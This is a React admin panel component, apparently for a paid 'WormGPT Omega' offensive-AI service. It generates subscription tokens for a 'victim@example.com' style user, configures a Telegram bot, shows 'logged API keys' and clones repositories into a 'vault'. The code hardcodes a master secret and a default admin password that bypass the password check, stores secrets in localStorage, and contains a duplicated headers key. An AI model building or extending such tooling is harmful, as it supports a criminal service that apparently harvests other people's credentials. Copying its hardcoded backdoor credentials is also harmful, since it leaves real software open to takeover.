
import React, { useState, useEffect } from 'react';
import { LogEntry } from '../types';

interface AdminPanelProps {
  addLog: (message: string, level: LogEntry['level']) => void;
}

interface UserToken {
  id: string;
  email: string;
  plan: 'WEEK' | 'MONTH' | 'YEAR';
  token: string;
  expiresAt: string;
  status: 'ACTIVE' | 'EXPIRED';
}

export const AdminPanel: React.FC<AdminPanelProps> = ({ addLog }) => {
  const [tokens, setTokens] = useState<UserToken[]>(() => {
    const saved = localStorage.getItem('whoamisec_user_tokens');
    return saved ? JSON.parse(saved) : [];
  });

  const [newEmail, setNewEmail] = useState('');
  const [newPlan, setNewPlan] = useState<'WEEK' | 'MONTH' | 'YEAR'>('WEEK');
  const [adminPassword, setAdminPassword] = useState('');
  const [newAdminPassword, setNewAdminPassword] = useState('');
  const [secretWord, setSecretWord] = useState('');
  const [repoUrl, setRepoUrl] = useState('');
  const [cloningLogs, setCloningLogs] = useState<string[]>([]);
  const [isCloning, setIsCloning] = useState(false);
  const [recoveryWords, setRecoveryWords] = useState<string[]>([]);
  const [showRecovery, setShowRecovery] = useState(false);
  const [loggedApiKeys, setLoggedApiKeys] = useState<any>({});
  
  // Telegram Config State
  const [tgToken, setTgToken] = useState(() => localStorage.getItem('whoamisec_tg_token') || '');
  const [tgChatId, setTgChatId] = useState(() => localStorage.getItem('whoamisec_tg_chat_id') || '');

  const MASTER_SECRET = 'MerleoskinMerleoskin77';

  useEffect(() => {
    localStorage.setItem('whoamisec_user_tokens', JSON.stringify(tokens));
  }, [tokens]);

  useEffect(() => {
    fetchLoggedKeys();
  }, []);

  const fetchLoggedKeys = async () => {
    try {
      const res = await fetch('/api/config/keys');
      const data = await res.json();
      setLoggedApiKeys(data);
    } catch (error) {
      console.error('Failed to fetch keys');
    }
  };

  const saveTelegramConfig = () => {
    localStorage.setItem('whoamisec_tg_token', tgToken);
    localStorage.setItem('whoamisec_tg_chat_id', tgChatId);
    addLog('ADMIN: Telegram configuration updated', 'success');
    alert('Telegram Config Saved');
  };

  const generateToken = () => {
    if (!newEmail) return;
    
    const duration = newPlan === 'WEEK' ? 7 : newPlan === 'MONTH' ? 30 : 365;
    const expiresAt = new Date();
    expiresAt.setDate(expiresAt.getDate() + duration);

    const newToken: UserToken = {
      id: Math.random().toString(36).substring(7),
      email: newEmail,
      plan: newPlan,
      token: `WHOAMI-${Math.random().toString(36).substring(2).toUpperCase()}`,
      expiresAt: expiresAt.toISOString(),
      status: 'ACTIVE'
    };

    setTokens(prev => [...prev, newToken]);
    setNewEmail('');
    addLog(`ADMIN: Token generated for ${newEmail} (${newPlan})`, 'success');
  };

  const handlePasswordChange = (e: React.FormEvent) => {
    e.preventDefault();
    const currentPass = localStorage.getItem('admin_password') || '#AllOfThem-3301';
    
    if (adminPassword === currentPass || secretWord === MASTER_SECRET) {
      localStorage.setItem('admin_password', newAdminPassword);
      setAdminPassword('');
      setNewAdminPassword('');
      setSecretWord('');
      addLog('ADMIN: Admin password updated successfully', 'success');
      alert('Password updated successfully');
    } else {
      addLog('ADMIN: Password update failed - invalid credentials', 'error');
      alert('Invalid current password or master key');
    }
  };

  const handleCloneRepo = async () => {
    if (!repoUrl) return;
    setIsCloning(true);
    setCloningLogs(['[SYSTEM] Initializing projection sequence...']);
    
    try {
      const res = await fetch('/api/admin/clone-repo', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ repoUrl })
      });
      const data = await res.json();
      if (data.success) {
        setCloningLogs(data.logs);
        addLog(`ADMIN: Repository cloned successfully: ${repoUrl}`, 'success');
      }
    } catch (error) {
      setCloningLogs(prev => [...prev, '[ERROR] Projection failed. Connection lost.']);
    } finally {
      setIsCloning(false);
    }
  };

  const fetchRecoveryWords = async () => {
    try {
      const res = await fetch('/api/admin/recovery-words');
      const data = await res.json();
      setRecoveryWords(data.words);
      setShowRecovery(true);
      addLog('ADMIN: Recovery words generated', 'info');
    } catch (error) {
      console.error('Failed to fetch recovery words');
    }
  };

  const deleteToken = (id: string) => {
    setTokens(prev => prev.filter(t => t.id !== id));
    addLog('ADMIN: User token revoked', 'warning');
  };

  return (
    <div className="space-y-6 animate-in fade-in duration-500 font-mono">
      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
        {/* Token Generation */}
        <div className="bg-[#0a0a0a] border border-[#dc2626]/20 p-6 rounded-2xl shadow-2xl">
          <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
            <i className="fas fa-key text-[#dc2626]"></i> Token Generation System
          </h3>
          
          <div className="space-y-4">
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">User Email</label>
              <input 
                type="email"
                value={newEmail}
                onChange={(e) => setNewEmail(e.target.value)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-[#dc2626]"
                placeholder="victim@example.com"
              />
            </div>
            
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">Subscription Plan</label>
              <select 
                value={newPlan}
                onChange={(e) => setNewPlan(e.target.value as any)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-[#dc2626]"
              >
                <option value="WEEK">Weekly - $30</option>
                <option value="MONTH">Monthly - $300</option>
                <option value="YEAR">Yearly - $1000</option>
              </select>
            </div>

            <button 
              onClick={generateToken}
              className="w-full bg-[#dc2626] text-black font-black py-3 rounded-lg uppercase tracking-widest hover:bg-[#ff0000] transition-all"
            >
              Generate_Access_Token
            </button>
          </div>
        </div>

        {/* Telegram Config */}
        <div className="bg-[#0a0a0a] border border-[#22c55e]/20 p-6 rounded-2xl shadow-2xl">
          <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
            <i className="fab fa-telegram text-[#22c55e]"></i> Telegram Bot Allocation
          </h3>
          
          <div className="space-y-4">
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">Bot Token</label>
              <input 
                type="password"
                value={tgToken}
                onChange={(e) => setTgToken(e.target.value)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-[#22c55e]"
                placeholder="123456789:ABCdefGHI..."
              />
            </div>
            
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">Chat ID</label>
              <input 
                type="text"
                value={tgChatId}
                onChange={(e) => setTgChatId(e.target.value)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-[#22c55e]"
                placeholder="-100123456789"
              />
            </div>

            <button 
              onClick={saveTelegramConfig}
              className="w-full bg-[#22c55e] text-black font-black py-3 rounded-lg uppercase tracking-widest hover:bg-[#4ade80] transition-all"
            >
              Update_Telegram_Allocation
            </button>
          </div>
        </div>
      </div>

      {/* User Management */}
      <div className="bg-[#0a0a0a] border border-white/5 p-6 rounded-2xl shadow-2xl">
        <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
          <i className="fas fa-users text-gray-400"></i> Active User Tokens
        </h3>
        <div className="overflow-x-auto">
          <table className="w-full text-left text-[10px]">
            <thead>
              <tr className="border-b border-white/5 text-gray-500 uppercase font-black">
                <th className="py-3 px-4">User Email</th>
                <th className="py-3 px-4">Plan</th>
                <th className="py-3 px-4">Access Token</th>
                <th className="py-3 px-4">Expires At</th>
                <th className="py-3 px-4">Status</th>
                <th className="py-3 px-4">Actions</th>
              </tr>
            </thead>
            <tbody>
              {tokens.map(token => (
                <tr key={token.id} className="border-b border-white/5 hover:bg-white/5 transition-colors">
                  <td className="py-3 px-4 text-white">{token.email}</td>
                  <td className="py-3 px-4">
                    <span className={`px-2 py-0.5 rounded text-[8px] font-black ${
                      token.plan === 'YEAR' ? 'bg-yellow-500/20 text-yellow-500' : 
                      token.plan === 'MONTH' ? 'bg-blue-500/20 text-blue-500' : 'bg-gray-500/20 text-gray-500'
                    }`}>
                      {token.plan}
                    </span>
                  </td>
                  <td className="py-3 px-4 text-[#dc2626] font-black">{token.token}</td>
                  <td className="py-3 px-4 text-gray-400">{new Date(token.expiresAt).toLocaleDateString()}</td>
                  <td className="py-3 px-4">
                    <span className="text-emerald-500 font-black">● {token.status}</span>
                  </td>
                  <td className="py-3 px-4">
                    <button onClick={() => deleteToken(token.id)} className="text-red-500 hover:text-red-400">
                      <i className="fas fa-trash"></i>
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>

      {/* GitHub Autonomous Projection */}
      <div className="bg-[#0a0a0a] border border-blue-500/20 p-6 rounded-2xl shadow-2xl">
        <h3 className="text-xs font-black text-white uppercase tracking-widest mb-6 flex items-center gap-2">
          <i className="fab fa-github text-blue-500"></i> WormGPT Omega Autonomous Projection
        </h3>
        
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-1 space-y-4">
            <div className="space-y-2">
              <label className="text-[10px] text-gray-500 uppercase font-black">Repository URL</label>
              <input 
                type="text"
                value={repoUrl}
                onChange={(e) => setRepoUrl(e.target.value)}
                className="w-full bg-black border border-white/10 rounded-lg py-2 px-4 text-white outline-none focus:border-blue-500"
                placeholder="https://github.com/user/repo"
              />
            </div>
            <button 
              onClick={handleCloneRepo}
              disabled={isCloning}
              className={`w-full font-black py-3 rounded-lg uppercase tracking-widest transition-all ${
                isCloning ? 'bg-gray-800 text-gray-500 cursor-not-allowed' : 'bg-blue-600 text-white hover:bg-blue-500'
              }`}
            >
              {isCloning ? 'PROJECTING...' : 'CLONE_REPO_TO_VAULT'}
            </button>
          </div>
          <div className="lg:col-span-2 bg-black border border-white/5 rounded-lg p-4 h-[150px] overflow-y-auto font-mono text-[10px]">
            {cloningLogs.map((log, i) => (
              <div key={i} className={log.includes('[ERROR]') ? 'text-red-500' : 'text-emerald-500'}>{log}</div>
            ))}
            {cloningLogs.length === 0 && <div className="text-gray-600">Waiting for projection command...</div>}
          </div>
        </div>
      </div>
    </div>
  );
};
